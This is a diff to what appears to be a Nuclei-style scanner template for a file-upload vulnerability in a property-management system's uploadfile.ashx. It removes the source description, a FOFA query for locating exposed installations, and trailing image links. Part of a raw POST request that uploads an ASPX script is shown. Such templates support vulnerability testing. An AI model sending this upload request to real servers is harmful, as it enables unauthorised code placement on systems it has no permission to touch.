@@ -3,12 +3,8 @@ info:
   name: 新视窗新一代物业管理系统 uploadfile.ashx 存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vfam969395l9kvln'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vfam969395l9kvln
-    fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
 http:
 - raw:
   - 'POST /script/uploadify/uploadfile.ashx?id=1 HTTP/1.1
@@ -71,7 +67,7 @@ http:
 
     Response.End();%>
 
-    ------WebKitFormBoundaryWQPGtgGbo1eMeYgQ--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787582720522-2bec38ff-d7f9-45d0-b64e-762c20a5e6d7.png)![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787582720883-e6204eb7-9c17-4c61-9fed-5d0c65a16a45.png)'
+    ------WebKitFormBoundaryWQPGtgGbo1eMeYgQ--'
   redirects: false
   matchers:
   - status:
